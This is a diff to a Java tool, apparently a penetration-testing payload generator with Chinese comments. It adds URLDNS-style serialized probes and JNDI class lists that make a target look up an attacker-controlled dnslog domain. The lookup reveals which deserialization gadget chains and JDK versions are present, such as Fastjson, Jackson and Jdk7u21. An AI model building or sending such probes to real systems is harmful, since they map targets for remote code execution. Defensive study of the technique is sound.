@@ -14,31 +14,39 @@ import javassist.CtClass;
 public class en {
 	static List<Object> list = new LinkedList<Object>();
 	static String dnslog;
-	static String[] defaultclass = {"CommonsCollections13567",
+	static String[] defaultclass = {
+				"CommonsCollections13567",
   				"CommonsCollections24",
-  				"CommonsBeanutils2","C3P0",
+  				"CommonsBeanutils2",
+  				"C3P0",
   				"AspectJWeaver",
   				"bsh",
   				"Groovy",
   				"Becl",
+  				"DefiningClassLoader",
   				"Jdk7u21",
   				"JRE8u20",
-  				"winlinux"};
+  				"Fastjson1",
+  				"Fastjson2",
+  				"Jackson1",
+  				"winlinux"
+  				};
 	static String[] jndidefaultclass = {
 			"org.apache.naming.factory.BeanFactory",
 			"javax.el.ELProcessor",
-			"groovy.lang.GroovyShell",
-			"groovy.lang.GroovyClassLoader",
+			//"groovy.lang.GroovyShell",//有Groovy所以可以省略了
+			//"groovy.lang.GroovyClassLoader",//有Groovy所以可以省略了
 			"org.yaml.snakeyaml.Yaml",
 			"com.thoughtworks.xstream.XStream",
-			"org.xmlpull.v1.XmlPullParserException",
-			"org.xmlpull.mxp1.MXParser",
+			//"org.xmlpull.v1.XmlPullParserException",//XStream依赖
+			//"org.xmlpull.mxp1.MXParser",//XStream依赖
 			"org.mvel2.sh.ShellSession",
-			"com.sun.glass.utils.NativeLibLoader",
+			//"com.sun.glass.utils.NativeLibLoader",//jdk默认就有
 			"org.apache.catalina.UserDatabase",
 			"org.apache.catalina.users.MemoryUserDatabaseFactory",
 			"org.h2.Driver",
 			"org.postgresql.Driver",
+			"org.springframework.context.support.ClassPathXmlApplicationContext",//postgresql RCE依赖spring环境
 			"com.mysql.jdbc.Driver",
 			"com.mysql.cj.jdbc.Driver",
 			"com.mysql.fabric.jdbc.FabricMySQLDriver",
@@ -46,14 +54,14 @@ public class en {
 			"org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory",
 			"org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory",
 			"org.apache.commons.dbcp.BasicDataSourceFactory",
-			"org.apache.commons.pool.KeyedObjectPoolFactory",
+			//"org.apache.commons.pool.KeyedObjectPoolFactory",//commons-dbcp1依赖
 			"org.apache.commons.dbcp2.BasicDataSourceFactory",
-			"org.apache.commons.pool2.PooledObjectFactory",
+			//"org.apache.commons.pool2.PooledObjectFactory",//commons-dbcp2依赖
 			"org.apache.tomcat.jdbc.pool.DataSourceFactory",
-			"org.apache.juli.logging.LogFactory",
+			//"org.apache.juli.logging.LogFactory",//tomcat-jdbc依赖
 			"com.alibaba.druid.pool.DruidDataSourceFactory",
 			"com.zaxxer.hikari.HikariJNDIFactory",
-			"org.slf4j.LoggerFactory",
+			//"org.slf4j.LoggerFactory",//HikariCP依赖
 			"com.ibm.ws.client.applicationclient.ClientJ2CCFFactory",
 			"com.ibm.ws.webservices.engine.client.ServiceFactory"
 			};
@@ -159,6 +167,11 @@ public class en {
 	  		HashMap becl = getURLDNSgadget("http://becl."+dnslog, "com.sun.org.apache.bcel.internal.util.ClassLoader");
 	  		list.add(becl);
 			break;
+		case "DefiningClassLoader":
+	  		//js-14.jar
+	  		HashMap js = getURLDNSgadget("http://DefiningClassLoader."+dnslog, "org.mozilla.javascript.DefiningClassLoader");
+	  		list.add(js);
+			break;
 		case "Jdk7u21":
 	  		//JDK<=7u21
 	  		HashMap Jdk7u21 = getURLDNSgadget("http://Jdk7u21."+dnslog, "com.sun.corba.se.impl.orbutil.ORBClassLoader");
@@ -168,6 +181,21 @@ public class en {
 	  		//7u25<=JDK<=8u20,虽然叫JRE8u20其实JDK8u20也可以,这个检测不完美,8u25版本以及JDK<=7u21会误报,可综合Jdk7u21来看
 	  		HashMap JRE8u20 = getURLDNSgadget("http://JRE8u20."+dnslog, "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1");
 	  		list.add(JRE8u20);
+			break;
+		case "Fastjson1":
+			//fastjson<=1248存在一个链,全版本也存在一个链
+			HashMap fastjson1 = getURLDNSgadget("http://fastjson."+dnslog, "com.alibaba.fastjson.JSONArray");
+	  		list.add(fastjson1);
+			break;
+		case "Fastjson2":
+			//fastjson<=1248存在一个链,全版本也存在一个链
+			HashMap fastjson2 = getURLDNSgadget("http://fastjson1249."+dnslog, "com.alibaba.fastjson.util.RyuDouble");
+	  		list.add(fastjson2);
+			break;
+		case "Jackson1":
+			//jackson-databind>=2.10.0存在一个链
+			HashMap jackson1 = getURLDNSgadget("http://jackson2100."+dnslog, "com.fasterxml.jackson.databind.node.NodeSerialization");
+	  		list.add(jackson1);
 			break;
 		case "winlinux":
 	  		//windows/linux版本判断
